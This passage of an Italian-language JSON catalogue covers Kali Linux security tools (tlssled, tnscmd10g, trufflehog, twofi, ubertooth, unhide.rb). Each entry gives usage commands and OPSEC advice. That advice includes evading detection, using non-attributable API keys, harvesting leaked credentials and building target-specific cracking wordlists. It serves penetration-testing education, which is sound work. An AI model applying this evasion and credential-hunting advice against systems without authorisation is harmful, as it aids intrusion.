i privilegi del processo web server. Payload errati o malformati possono causare crash dell'applicazione o corruzione del template engine, impattando la disponibilita del servizio. In ambienti di produzione, e fondamentale procedere con cautela e validare ogni step.</p><p><strong>Mitigazioni:</strong> Iniziare sempre con payload di detection non distruttivi (espressioni matematiche) prima di tentare command execution. Utilizzare un ambiente di staging quando disponibile per i test iniziali. Documentare ogni payload inviato per facilitare il cleanup post-engagement. Coordinare con il team di sviluppo per garantire che eventuali effetti collaterali vengano identificati e risolti rapidamente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SSTI"
    ],
    "notes": null
  },
  {
    "id": "tlssled",
    "name": "tlssled",
    "version": "1.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tlssled/",
    "desc": "Wrapper per sslscan e openssl per audit rapido SSL/TLS con report formattato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>TLSSLed</strong> e uno script shell che funge da wrapper intelligente per sslscan e openssl, combinando le capacita di entrambi gli strumenti per eseguire audit rapidi e completi delle configurazioni SSL/TLS. Lo script automatizza una serie di test che normalmente richiederebbero l'esecuzione manuale di molteplici comandi openssl s_client e sslscan, presentando i risultati in un report formattato con codici colore per immediata leggibilita. TLSSLed verifica la presenza di protocolli obsoleti (SSLv2, SSLv3), cipher suite deboli, configurazioni certificate chain, supporto per rinegoziazione sicura, e numerose altre impostazioni rilevanti per la sicurezza. Lo strumento e particolarmente utile per assessment rapidi dove non e necessaria la profondita di strumenti come testssl.sh ma si desidera comunque una copertura superiore rispetto a un singolo comando openssl.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Audit Protocolli e Cipher Suite:</strong> TLSSLed testa sistematicamente tutti i protocolli SSL/TLS supportati dal server (SSLv2, SSLv3, TLSv1.0, TLSv1.1, TLSv1.2, TLSv1.3) e le cipher suite associate. Identifica configurazioni insicure come cipher NULL, export, RC4, DES e altre suite deprecate. Il report evidenzia con colori diversi le configurazioni sicure, deboli e critiche, facilitando l'identificazione immediata dei problemi.</p><p><strong>Analisi Certificato e Chain:</strong> Lo script esamina il certificato del server verificando validita temporale, algoritmo di firma, lunghezza della chiave, Subject Alternative Names (SAN), e completezza della certificate chain. Identifica certificati self-signed, scaduti, o con chiavi di lunghezza insufficiente. Questa analisi automatizzata copre i controlli piu comuni richiesti durante assessment di compliance.</p><p><strong>Test Vulnerabilita Specifiche:</strong> TLSSLed verifica la presenza di vulnerabilita note nella configurazione TLS come supporto per rinegoziazione client-initiated (CVE-2009-3555), CRIME (compressione TLS), e configurazioni che potrebbero essere vulnerabili a BEAST o POODLE. Ogni test produce un risultato chiaro pass/fail con spiegazione del rischio associato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>TLSSLed accetta come parametri l'hostname o IP del target e la porta del servizio TLS da testare. Lo script esegue automaticamente tutti i test disponibili e presenta un report completo.</p><pre><code># Audit completo HTTPS\ntlssled target.com 443\n\n# Test su servizio SMTPS\ntlssled mail.target.com 465\n\n# Test su IMAPS\ntlssled mail.target.com 993\n\n# Salvare output su file mantenendo i colori\ntlssled target.com 443 | tee tls_report.txt\n\n# Test su porta custom\ntlssled internal-server.local 8443</code></pre><p>Lo script richiede che sslscan e openssl siano installati nel sistema. Su Kali Linux entrambe le dipendenze sono generalmente presenti di default. I risultati sono presentati in formato tabulare con indicatori colorati per facilitare la lettura rapida.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di <strong>assessment rapido</strong> durante penetration test, TLSSLed viene utilizzato per ottenere velocemente una panoramica della configurazione TLS di tutti i servizi esposti, identificando immediatamente le vulnerabilita critiche senza la necessita di configurare strumenti piu complessi. Per <strong>verifiche di compliance</strong> come PCI-DSS, lo strumento fornisce rapidamente le informazioni necessarie per determinare se i protocolli e le cipher suite utilizzate soddisfano i requisiti minimi. Nel contesto di <strong>monitoraggio continuo della sicurezza</strong>, TLSSLed puo essere integrato in script di automazione per verificare periodicamente che le configurazioni TLS dei servizi non siano regredite dopo aggiornamenti o modifiche infrastrutturali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'esecuzione di TLSSLed genera multiple connessioni TLS al server target, ciascuna con parametri diversi per testare protocolli e cipher suite specifici. Questo pattern di connessioni rapide con diverse configurazioni TLS e facilmente identificabile da IDS come attivita di security scanning. I log del web server registreranno tutte le connessioni anche se non viene inviato alcun payload HTTP.</p><p><strong>Impatto operativo:</strong> Il numero di connessioni generate e relativamente contenuto rispetto ad altri scanner, ma puo comunque essere notato su servizi a basso traffico. Alcuni server configurati in modo restrittivo potrebbero bloccare l'IP sorgente dopo ripetuti tentativi di handshake con protocolli obsoleti. Lo script non supporta nativamente l'uso di proxy, limitando le opzioni di anonimizzazione.</p><p><strong>Mitigazioni:</strong> Eseguire lo scan durante orari di traffico elevato per mimetizzare le connessioni nel rumore di fondo. Se possibile, utilizzare un tunnel SSH o VPN per instradare il traffico attraverso un IP meno sospetto. Coordinare preventivamente con il team operativo per evitare che le connessioni vengano interpretate come attacco e portino a blocchi dell'IP dell'operatore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "tnscmd10g",
    "name": "tnscmd10g",
    "version": "1.3",
    "icon": "../app/icons/tnscmd10g-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tnscmd10g/",
    "desc": "Invia comandi TNS a Oracle listener per version detection e service enumeration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>tnscmd10g</strong> e uno strumento specializzato per l'interazione con Oracle TNS (Transparent Network Substrate) Listener, il componente di rete responsabile della gestione delle connessioni ai database Oracle. Lo strumento permette di inviare comandi nativi al protocollo TNS per ottenere informazioni dettagliate sulla configurazione del listener, come la versione di Oracle in esecuzione, i servizi registrati, lo stato operativo e i parametri di configurazione. tnscmd10g e scritto in Perl e implementa direttamente il protocollo TNS, senza dipendere da client Oracle installati localmente. Questo lo rende particolarmente utile durante penetration test dove l'installazione di Oracle Instant Client non e praticabile, e rappresenta spesso il primo strumento utilizzato quando viene identificata la porta 1521 (default Oracle) durante la fase di port scanning.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Version Detection e Fingerprinting:</strong> Il comando version interroga il listener per ottenere la versione esatta di Oracle in esecuzione, incluso il numero di patch. Questa informazione e critica per identificare installazioni non aggiornate e vulnerabilita note specifiche della versione. Il fingerprinting accurato permette di selezionare exploit e tecniche di attacco appropriate per la versione identificata.</p><p><strong>Service Enumeration:</strong> Il comando services elenca tutti i servizi database registrati presso il listener, rivelando i nomi delle istanze Oracle, i service name, e potenzialmente i SID (System Identifier). Queste informazioni sono essenziali per tentare connessioni al database, poiche richiedono un SID o service name valido. In ambienti con multiple istanze, questa enumerazione mappa completamente la superficie di attacco dei database Oracle.</p><p><strong>Status e Configurazione Listener:</strong> Il comando status fornisce informazioni operative sul listener, inclusi il tempo di attivita (uptime), il protocollo e l'indirizzo di ascolto, e la versione del protocollo SNMP se abilitato. Queste informazioni aiutano a comprendere l'architettura del deployment Oracle e possono rivelare configurazioni insicure come listener non protetti da password o con logging disabilitato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>tnscmd10g si utilizza dalla riga di comando specificando il comando TNS da inviare e l'host target. La porta predefinita e 1521 ma puo essere modificata con il flag -p.</p><pre><code># Ottenere versione Oracle listener\ntnscmd10g version -h 192.168.1.100\n\n# Verificare stato del listener\ntnscmd10g status -h 192.168.1.100\n\n# Enumerare servizi registrati\ntnscmd10g services -h 192.168.1.100\n\n# Specificare porta non standard\ntnscmd10g version -h 192.168.1.100 -p 1522\n\n# Inviare comando ping al listener\ntnscmd10g ping -h 192.168.1.100</code></pre><p>Si noti che nelle versioni moderne di Oracle (dalla 10g in poi), molti comandi TNS richiedono l'autenticazione del listener tramite password. Listener non configurati con password (configurazione insicura) rispondono liberamente a tutti i comandi, rappresentando essi stessi una vulnerabilita di configurazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>database enumeration</strong> in un penetration test, tnscmd10g viene utilizzato come primo punto di contatto con istanze Oracle scoperte durante il port scanning. Le informazioni raccolte (versione, SID, servizi) alimentano le fasi successive dell'attacco, come brute force di credenziali con strumenti come odat o hydra. In contesti di <strong>vulnerability assessment</strong>, l'identificazione precisa della versione Oracle permette di correlare l'installazione con CVE note e verificare la conformita con i requisiti di patching dell'organizzazione. Per attivita di <strong>asset inventory</strong>, lo strumento mappa rapidamente tutte le istanze Oracle presenti nella rete, identificando deployment non documentati o shadow IT che sfuggono ai processi di gestione centralizzata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query TNS vengono registrate nei log del listener Oracle (listener.log), includendo timestamp, IP sorgente e comando inviato. Sistemi di monitoraggio Oracle come Oracle Audit Vault possono generare alert per query da IP non autorizzati. Il traffico sulla porta 1521 e monitorato da molti IDS con regole specifiche per protocolli database.</p><p><strong>Impatto operativo:</strong> I comandi di enumerazione sono operazioni di sola lettura che non impattano le performance del database. Tuttavia, tentativi ripetuti contro listener protetti da password possono generare entry di log significative. In ambienti con Oracle RAC (Real Application Clusters), le query potrebbero rivelare informazioni sull'intera infrastruttura cluster.</p><p><strong>Mitigazioni:</strong> Limitare il numero di query al minimo necessario per ottenere le informazioni richieste. Eseguire l'enumerazione durante finestre di test concordate per evitare che gli alert generino risposta incident non necessaria. Documentare tutte le query inviate per il report finale e per facilitare la correlazione con i log del cliente durante la fase di debrief.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "trufflehog",
    "name": "trufflehog",
    "version": "3.57.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/trufflehog/",
    "desc": "Trova secrets in repository Git: API keys, password, token nei commit storici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>TruffleHog</strong> e uno strumento di sicurezza progettato per rilevare secrets, credenziali e chiavi API accidentalmente esposti in repository Git e altre sorgenti di codice. A differenza di scanner superficiali che analizzano solo lo stato attuale dei file, TruffleHog scansiona l'intera cronologia dei commit Git, esaminando ogni diff per identificare secrets che potrebbero essere stati introdotti e successivamente rimossi. Lo strumento utilizza una combinazione di analisi entropica (per rilevare stringhe ad alta casualita tipiche di chiavi crittografiche) e pattern regex specifici per oltre 700 tipi di credenziali conosciute, incluse chiavi AWS, token GitHub, password database e API key di servizi cloud. La versione 3.x, completamente riscritta in Go da Truffle Security, aggiunge la capacita di verificare automaticamente se i secrets trovati sono ancora validi, riducendo drasticamente i falsi positivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Scansione Cronologia Git Completa:</strong> TruffleHog esamina ogni commit nella storia del repository, analizzando le diff per identificare secrets introdotti in qualsiasi momento. Questo e fondamentale perche un secret committato e poi rimosso rimane accessibile nella storia Git fino a quando non viene eseguito un force push o un rebase distruttivo. La scansione copre tutti i branch, tag e reference, garantendo che nessun secret sfugga anche se presente solo in branch feature mai mergiati.</p><p><strong>Verificazione Automatica dei Secrets:</strong> Una delle funzionalita piu potenti di TruffleHog v3 e la capacita di verificare se i secrets trovati sono ancora attivi. Per ogni tipo di credenziale supportato, lo strumento esegue una chiamata API di test (non distruttiva) per determinare se la chiave e ancora valida. Questa verifica riduce enormemente il rumore nell'output, permettendo ai tester di concentrarsi su secrets effettivamente sfruttabili piuttosto che su credenziali gia revocate.</p><p><strong>Supporto Multi-Sorgente:</strong> Oltre ai repository Git locali e remoti, TruffleHog puo scansionare intere organizzazioni GitHub/GitLab, bucket S3, filesystem locali, e immagini Docker. Il modulo per GitHub supporta la scansione di tutti i repository pubblici e privati di un'organizzazione con un singolo comando, facilitando audit di sicurezza su larga scala per aziende con centinaia di repository.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>TruffleHog v3 utilizza una sintassi basata su sottomandi per specificare la sorgente da scansionare. Il flag --only-verified filtra i risultati mostrando solo secrets confermati come attivi.</p><pre><code># Scansione repository Git locale\ntrufflehog filesystem /path/to/repo\n\n# Scansione repository GitHub remoto\ntrufflehog github --repo https://github.com/org/repo\n\n# Scansione intera organizzazione GitHub\ntrufflehog github --org target-organization --token ghp_xxx\n\n# Solo secrets verificati come attivi\ntrufflehog github --repo https://github.com/org/repo --only-verified\n\n# Output in formato JSON per parsing automatizzato\ntrufflehog filesystem /path/to/repo --json\n\n# Scansione bucket S3\ntrufflehog s3 --bucket target-bucket-name</code></pre><p>Per scansioni di organizzazioni GitHub private e necessario fornire un token con permessi adeguati (repo scope). La scansione di grandi repository con migliaia di commit puo richiedere tempo significativo; il flag --since-commit permette di limitare l'analisi ai commit recenti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel contesto di <strong>penetration test e red team</strong>, TruffleHog viene utilizzato per cercare credenziali esposte in repository pubblici dell'organizzazione target. Chiavi AWS, database connection string e token API trovati in repository GitHub pubblici forniscono spesso un vettore di initial access con minimo rischio di detection. Per attivita di <strong>DevSecOps e sicurezza preventiva</strong>, lo strumento viene integrato nelle pipeline CI/CD per bloccare commit contenenti secrets prima che raggiungano il repository remoto. In programmi di <strong>bug bounty</strong>, TruffleHog e uno dei primi strumenti utilizzati per cercare credenziali nei repository pubblici delle aziende target, con findings che tipicamente vengono classificati come severita critica o alta.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La scansione di repository pubblici tramite HTTPS non genera alert lato target. Tuttavia, la clonazione di repository privati o l'uso delle API GitHub con token rubati viene loggato nei security audit log dell'organizzazione. Le chiamate di verifica dei secrets (quando --only-verified e attivo) contattano direttamente i servizi delle credenziali trovate, generando potenzialmente log nei sistemi target.</p><p><strong>Impatto operativo:</strong> La scansione di repository con storia molto lunga puo richiedere ore e consumare significativa larghezza di banda e spazio disco. Le API di GitHub hanno rate limit che possono rallentare scansioni di grandi organizzazioni. I secrets verificati come attivi rappresentano vulnerabilita critiche che richiedono comunicazione immediata al cliente per la revoca.</p><p><strong>Mitigazioni:</strong> Utilizzare token API dedicati e non riconducibili ad account personali per scansioni su piattaforme cloud. Eseguire le verifiche dei secrets da ambienti isolati (VPN dedicata) per evitare che i log di accesso ai servizi cloud siano correlabili ad altre attivita dell'engagement. Segnalare immediatamente al cliente qualsiasi secret attivo trovato, senza attendere la conclusione dell'assessment.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "twofi",
    "name": "twofi",
    "version": "2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/twofi/",
    "desc": "Genera wordlist da profili Twitter per password cracking targetizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Twofi</strong> (Twitter Words of Interest) e uno strumento di generazione wordlist che sfrutta il contenuto pubblico dei profili Twitter (ora X) per creare dizionari personalizzati orientati al password cracking. L'approccio di Twofi si basa sulla psicologia delle password: gli utenti tendono a scegliere password basate su interessi personali, hobby, squadre sportive, artisti preferiti e terminologia professionale, tutti elementi che emergono frequentemente nei loro post sui social media. Lo strumento estrae e analizza i tweet di uno o piu utenti target, identificando le parole piu ricorrenti e significative per generare wordlist altamente mirate. Rispetto a dizionari generici come rockyou.txt, le wordlist generate da Twofi hanno un tasso di successo significativamente superiore negli attacchi targetizzati, poiche riflettono il vocabolario specifico della vittima. Lo strumento supporta anche l'analisi di ricerche per hashtag e trending topic per creare wordlist tematiche.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Estrazione Intelligente del Vocabolario:</strong> Twofi scarica i tweet pubblici del profilo target e li analizza estraendo le parole significative. Lo strumento filtra automaticamente stop words, URL, menzioni (@username) e hashtag puri, concentrandosi sulle parole di contenuto che hanno maggiore probabilita di essere utilizzate come password o componenti di password. L'analisi di frequenza ordina i termini per rilevanza, posizionando in cima alla wordlist le parole piu ricorrenti.</p><p><strong>Parametri di Filtraggio Personalizzabili:</strong> Lo strumento permette di configurare la lunghezza minima delle parole estratte, escludendo termini troppo corti che sono statisticamente meno probabili come password. E possibile anche specificare la lunghezza massima e combinare i risultati di piu profili in un'unica wordlist consolidata. Questa flessibilita permette di generare dizionari ottimizzati per le specifiche policy di password del target.</p><p><strong>Integrazione con Pipeline di Cracking:</strong> Le wordlist generate sono in formato testo semplice, direttamente compatibili con strumenti di password cracking come Hashcat, John the Ripper e Hydra. Le parole possono essere ulteriormente elaborate con regole di mangling (aggiunta numeri, maiuscole, caratteri speciali) per espandere lo spazio di ricerca mantenendo la rilevanza semantica del dizionario originale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Twofi richiede API key Twitter (Bearer Token) per accedere ai tweet. Le credenziali devono essere configurate nel file di configurazione o passate come variabili d'ambiente.</p><pre><code># Generare wordlist da singolo profilo\ntwofi --user target_username\n\n# Con lunghezza minima parole di 6 caratteri\ntwofi --user target_username --min 6\n\n# Analisi di piu profili simultaneamente\ntwofi --user user1,user2,user3\n\n# Output su file per uso con hashcat\ntwofi --user target_username > custom_wordlist.txt\n\n# Ricerca per termine/hashtag\ntwofi --search \"company_name\"\n\n# Combinare con regole hashcat per mangling\ntwofi --user target > base.txt && hashcat -r rules/best64.rule --stdout base.txt > expanded.txt</code></pre><p>A causa delle restrizioni API introdotte da Twitter/X, l'accesso alle API richiede un account developer con piano adeguato. Le limitazioni di rate possono influenzare il numero di tweet recuperabili per sessione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nello scenario di <strong>password cracking targetizzato</strong>, Twofi viene utilizzato dopo aver ottenuto hash di password (da dump database, NTDS.dit, o file SAM) per generare un dizionario personalizzato basato sugli interessi della vittima. Questo approccio e particolarmente efficace contro utenti tecnici che utilizzano termini del loro settore come base per le password. Per campagne di <strong>social engineering</strong>, le parole chiave estratte dai profili social aiutano a costruire pretesti credibili e personalizzati che risuonano con gli interessi del target. In contesti di <strong>security awareness assessment</strong>, le wordlist generate dimostrano ai dirigenti quanto sia facile per un attaccante creare dizionari personalizzati basati su informazioni pubbliche, evidenziando l'importanza di password non correlate a informazioni personali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'accesso ai tweet avviene attraverso le API ufficiali di Twitter, che registrano l'applicazione richiedente tramite le API key. L'attivita non e direttamente visibile al profilo target ma e loggata da Twitter. L'utilizzo di API key compromesse o condivise puo portare alla revoca dell'accesso e all'identificazione dell'operatore.</p><p><strong>Impatto operativo:</strong> Le restrizioni API di Twitter/X hanno significativamente limitato l'efficacia di Twofi, con piani gratuiti che offrono accesso molto ridotto. Profili con tweet protetti non sono accessibili senza following approvato. Le wordlist generate sono efficaci solo se il target utilizza effettivamente informazioni personali nelle password, limitazione intrinseca dell'approccio basato su social media.</p><p><strong>Mitigazioni:</strong> Utilizzare API key dedicate non riconducibili all'identita operativa. Combinare le wordlist di Twofi con altri dizionari e regole di mangling per massimizzare la copertura. Rispettare i termini di servizio della piattaforma e le normative sulla privacy applicabili. Conservare le wordlist generate in modo sicuro poiche contengono informazioni derivate da dati personali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Generators"
    ],
    "notes": null
  },
  {
    "id": "ubertooth",
    "name": "ubertooth",
    "version": "2020.12.R1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ubertooth/",
    "desc": "Piattaforma Bluetooth sniffing e injection per attacchi su BLE e Bluetooth Classic.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ubertooth</strong> e una piattaforma open-source hardware e software progettata per la security research sul protocollo Bluetooth. Basata sul dongle hardware Ubertooth One, la suite software permette di catturare, analizzare e iniettare pacchetti Bluetooth Classic e Bluetooth Low Energy (BLE) operando direttamente a livello di PHY layer a 2.4 GHz. A differenza degli adattatori Bluetooth standard che operano solo attraverso lo stack HCI del sistema operativo, Ubertooth fornisce accesso raw al livello radio, permettendo operazioni impossibili con hardware commerciale come lo sniffing passivo di connessioni Bluetooth altrui, il frequency hopping following, e l'injection di pacchetti arbitrari. La piattaforma e stata sviluppata da Michael Ossmann ed e diventata lo strumento di riferimento per la ricerca accademica e professionale sulla sicurezza Bluetooth, essendo l'unica soluzione open-source che offre capacita complete di analisi a livello radio.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Sniffing BLE Passivo:</strong> Ubertooth cattura pacchetti Bluetooth Low Energy in modo completamente passivo, senza necessita di partecipare alla connessione. Lo strumento puo seguire le advertising dei dispositivi BLE, catturare connection request per determinare i parametri di connessione, e decodificare il traffico dati quando la connessione non utilizza encryption o quando la chiave e nota. L'output puo essere salvato in formato PCAP per analisi successiva con Wireshark.</p><p><strong>Bluetooth Classic Frequency Hopping:</strong> Per le connessioni Bluetooth Classic, Ubertooth implementa algoritmi di frequency hopping following che permettono di tracciare la sequenza di salti di frequenza di una connessione attiva. Determinando il clock del master device e la sequenza di hopping, lo strumento puo catturare pacchetti da connessioni Bluetooth Classic in corso, operazione impossibile con hardware standard che non ha visibilita sui canali non assegnati.</p><p><strong>Analisi Spettrale 2.4 GHz:</strong> Lo strumento include un analizzatore di spettro in tempo reale per la banda 2.4 GHz, visualizzando l'attivita radio nell'intero spettro utilizzato da Bluetooth, WiFi e altri protocolli. Questa funzionalita e utile per identificare dispositivi Bluetooth attivi nell'area, valutare l'interferenza radio, e comprendere l'ambiente RF prima di iniziare operazioni di sniffing mirate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La suite Ubertooth include diversi tool da riga di comando, ciascuno specializzato per un'operazione specifica. Il dongle Ubertooth One deve essere collegato via USB e il firmware deve essere aggiornato alla versione compatibile con il software installato.</p><pre><code># Analizzatore di spettro 2.4 GHz in tempo reale\nubertooth-specan -G\n\n# Sniffing passivo BLE su tutti i canali advertising\nubertooth-btle -f\n\n# Seguire un dispositivo BLE specifico\nubertooth-btle -t AA:BB:CC:DD:EE:FF\n\n# Cattura BLE con output PCAP per Wireshark\nubertooth-btle -f -c capture.pcap\n\n# Determinare LAP di dispositivi Bluetooth Classic\nubertooth-rx\n\n# Seguire connessione Bluetooth Classic con LAP noto\nubertooth-follow -l 00:11:22</code></pre><p>Il firmware del dongle Ubertooth deve corrispondere alla versione del software host. Aggiornamenti firmware si eseguono con ubertooth-dfu. E consigliabile verificare la compatibilita delle versioni dopo ogni aggiornamento del sistema.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>sicurezza IoT</strong>, Ubertooth e fondamentale per analizzare le comunicazioni BLE di dispositivi smart home, wearable, e dispositivi medicali. La cattura del traffico BLE rivela spesso autenticazione debole o assente, trasmissione di dati sensibili in chiaro, e protocolli proprietari reverse-engineerabili. Per la <strong>ricerca accademica sulla sicurezza Bluetooth</strong>, la piattaforma fornisce l'unico mezzo open-source per studiare vulnerabilita a livello di protocollo come KNOB (Key Negotiation of Bluetooth), BIAS (Bluetooth Impersonation Attacks), e BLURtooth. In scenari di <strong>red team fisico</strong>, Ubertooth permette di intercettare comunicazioni Bluetooth in ambienti target per identificare dispositivi, mappare relazioni di pairing, e potenzialmente catturare credenziali o dati sensibili trasmessi via Bluetooth.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo sniffing passivo con Ubertooth e virtualmente non rilevabile poiche il dongle opera in modalita di sola ricezione senza trasmettere. Tuttavia, alcune operazioni come l'injection di pacchetti o il jamming sono rilevabili da altri dispositivi nell'area. L'hardware Ubertooth One ha un form factor distintivo che puo attirare attenzione durante operazioni sul campo.</p><p><strong>Impatto operativo:</strong> Il range effettivo del Bluetooth (tipicamente 10-30 metri per BLE, fino a 100 metri per Classic con antenna adeguata) richiede prossimita fisica al target. Le connessioni Bluetooth Classic con encryption sono difficili da decifrare senza la chiave di pairing. Il firmware dell'Ubertooth puo occasionalmente bloccarsi richiedendo un reset USB, interrompendo la cattura.</p><p><strong>Mitigazioni:</strong> Utilizzare antenne direzionali per aumentare il range e operare da distanze maggiori. Mascherare l'hardware Ubertooth in contenitori anonimi durante operazioni sul campo. Eseguire le catture durante periodi di attivita normale per mimetizzarsi. Verificare la legislazione locale sull'intercettazione di comunicazioni radio prima di procedere, poiche in molte giurisdizioni lo sniffing Bluetooth puo violare normative sulle telecomunicazioni.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "unhide.rb",
    "name": "unhide.rb",
    "version": "22",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unhide.rb/",
    "desc": "Script Ruby per rilevare processi e connessioni nascosti da rootkit su sistemi Unix.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Unhide.rb</strong> e una reimplementazione in linguaggio Ruby dello strumento forense unhide, progettata per rilevare processi, porte di rete e connessioni nascosti da rootkit e malware avanzato su sistemi Unix e Linux. Lo strumento opera confrontando i risultati di diverse system call e interfacce del kernel (/proc filesystem, syscall dirette, output di comandi di sistema) per identificare discrepanze che indicano la presenza di meccanismi di hiding attivi. Quando un rootkit nasconde un processo, tipicamente intercetta alcune system call (come readdir su /proc) ma non tutte le possibili vie di enumerazione; unhide.rb sfrutta queste inconsistenze per rivelare l'attivita nascosta. La scelta di Ruby come linguaggio di implementazione offre vantaggi in termini di leggibilita del codice, facilita di estensione con nuove tecniche di detection, e portabilita tra diverse distribuzioni Unix senza necessita di compilazione. Lo strumento e particolarmente utile in scenari di incident response dove si sospetta la presenza di rootkit userland.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Rilevamento Processi Nascosti:</strong> Unhide.rb confronta la lista di processi ottenuta attraverso il filesystem /proc con quella restituita da system call dirette come kill(pid, 0) e da brute force di PID space. Se un processo risponde a segnali ma non appare in /proc, e probabile che un rootkit stia intercettando le operazioni di directory listing. Lo strumento testa ogni PID possibile nel range del sistema, identificando quelli attivi ma invisibili agli strumenti standard come ps e top.</p><p><strong>Scansione Porte TCP/UDP Nascoste:</strong> Analogamente ai processi, unhide.rb verifica la coerenza tra le porte di rete riportate da /proc/net/tcp e /proc/net/udp e quelle effettivamente in ascolto verificate tramite tentativi di connessione o binding. Rootkit che nascondono backdoor di rete spesso intercettano la lettura di /proc/net ma non riescono a nascondere la porta dal punto di vista delle system call socket, permettendo il rilevamento.</p><p><strong>Tecniche Multiple di Verifica:</strong> Lo strumento implementa diverse strategie di detection che possono essere combinate per massimizzare la copertura. Ogni tecnica sfrutta un percorso diverso per enumerare le risorse di sistema, rendendo piu difficile per un rootkit eludere tutti i metodi simultaneamente. L'approccio multi-tecnica riduce significativamente i falsi negativi rispetto a strumenti che si affidano a una singola metodologia.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Unhide.rb deve essere eseguito con privilegi di root per accedere a tutte le informazioni di sistema necessarie per il confronto incrociato. Lo strumento accetta sottomandi che specificano il tipo di scansione da eseguire.</p><pre><code># Scansione processi nascosti\nsudo unhide-rb proc\n\n# Scansione porte TCP nascoste\nsudo unhide-rb tcp\n\n# Scansione completa (processi + porte)\nsudo unhide-rb all\n\n# Modalita verbose con dettagli di ogni test\nsudo unhide-rb -v proc\n\n# Output su file per analisi successiva\nsudo unhide-rb all > /tmp/unhide_report.txt 2>&1</code></pre><p>E importante eseguire lo strumento da un supporto fidato (USB live, montaggio read-only) quando possibile, poiche su un sistema compromesso il rootkit potrebbe alterare anche il comportamento di unhide.rb stesso. In alternativa, copiare il binario Ruby e lo script su un percorso non standard per ridurre la probabilita che il rootkit li intercetti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante le operazioni di <strong>incident response</strong>, unhide.rb viene eseguito come parte della triage iniziale su sistemi sospetti per determinare rapidamente se sono presenti rootkit userland che nascondono processi malevoli. La presenza di processi nascosti e un indicatore forte di compromissione avanzata che richiede analisi forense approfondita. Per attivita di <strong>threat hunting proattivo</strong>, lo strumento viene eseguito periodicamente su server critici come misura di verifica dell'integrita, confrontando i risultati con una baseline nota. In contesti di <strong>analisi forense post-incidente</strong>, i risultati di unhide.rb vengono correlati con altri artefatti forensi (log, timeline filesystem, dump di memoria) per ricostruire la sequenza temporale dell'attacco e identificare tutti i componenti del malware installato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'esecuzione di unhide.rb e essa stessa un'attivita che puo essere rilevata da rootkit sofisticati. Rootkit kernel-level possono monitorare l'esecuzione di programmi noti di detection e alterare il loro comportamento di conseguenza, nascondendo anche i processi che normalmente verrebbero rilevati. L'accesso massivo a /proc e il brute force di PID possono generare attivita anomala nei log di audit del kernel.</p><p><strong>Impatto operativo:</strong> La scansione brute force dell'intero PID space puo richiedere tempo significativo su sistemi con PID range ampio (default 32768 su Linux, configurabile fino a 4194304). False positive possono verificarsi a causa di condizioni di race dove processi terminano tra una verifica e l'altra. Lo strumento non rileva rootkit kernel-level sofisticati che intercettano tutte le system call utilizzate per il 